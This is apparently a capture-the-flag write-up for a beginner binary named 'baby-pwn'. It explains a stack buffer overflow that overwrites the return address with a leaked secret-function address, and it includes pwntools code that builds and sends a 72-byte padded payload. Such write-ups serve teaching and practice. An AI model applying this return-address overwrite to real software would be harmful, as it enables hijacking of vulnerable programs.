The payload needs to overflow the buffer and overwrite the return address with the address of the secret function. The buffer is 64 bytes, and the saved return address is 8 bytes after the buffer. 

The program gives us the address of the secret function.

The payload will be 72 bytes of padding followed by the address of the secret function. 

```py
payload = b'A' * 72 + p64(secret_function)
```

Then we can send the payload to the program to get the flag.

```py
p = process('./baby-pwn')
p.sendline(payload)
p.interactive()
```

The full script is at [solve.py](solve.py).